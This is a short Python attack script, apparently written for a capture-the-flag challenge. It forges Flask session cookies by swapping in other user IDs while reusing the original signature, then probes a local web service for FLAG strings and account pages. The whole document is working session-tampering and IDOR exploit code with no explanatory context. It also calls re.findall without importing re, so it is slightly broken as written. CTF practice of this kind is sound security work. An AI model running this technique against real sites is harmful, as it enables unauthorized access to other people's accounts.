import requests
import base64
import json

# Original session cookie
cookie_template = "eyJ1c2VyX2lkIjoxMDAzMn0.aVfKCw.jl3AMMmNnBqRtf0OTxwr0Uo3aeg"
parts = cookie_template.split('.')
_, timestamp, signature = parts

print("[*] Testing Session IDOR - Accessing different user accounts\n")

# Test a range of user IDs that might be interesting
interesting_ids = [1, 2, 3, 4, 5, 10, 100, 1000, 9999, 10000, 10001]

for user_id in interesting_ids:
    # Create payload for this user ID
    payload = {"user_id": user_id}
    payload_str = json.dumps(payload, separators=(',', ':'))
    
    # Re-encode the payload (Flask style - no padding)
    payload_b64 = base64.urlsafe_b64encode(payload_str.encode('utf-8')).decode('utf-8').rstrip('=')
    
    # Create the cookie (keeping same timestamp and signature)
    tampered_cookie = f"{payload_b64}.{timestamp}.{signature}"
    
    # Test it
    headers = {'Cookie': f'session={tampered_cookie}'}
    try:
        response = requests.get('http://127.0.0.1:33198/', headers=headers, timeout=5)
        
        # Check for flags in response
        flag_pattern = r'FLAG\{[^}]+\}'
        flags = re.findall(flag_pattern, response.text)
        
        if flags:
            print(f"[!] FLAG FOUND with user_id={user_id}:")
            for flag in flags:
                print(f"    {flag}")
            print()
        
        # Check response content length - different lengths might indicate different pages
        print(f"[*] user_id={user_id:>5} | Status: {response.status_code} | Length: {len(response.text):>4}B")
        
        # Look for interesting content patterns
        if "Welcome" in response.text:
            welcome_msg = response.text.split("Welcome")[1].split("</")[0].strip()
            print(f"    Content: Welcome{welcome_msg}")
        
    except Exception as e:
        print(f"[!] Error with user_id={user_id}: {e}")

print("\n[*] Test complete. Look for anomalies in response lengths or FLAG patterns.")
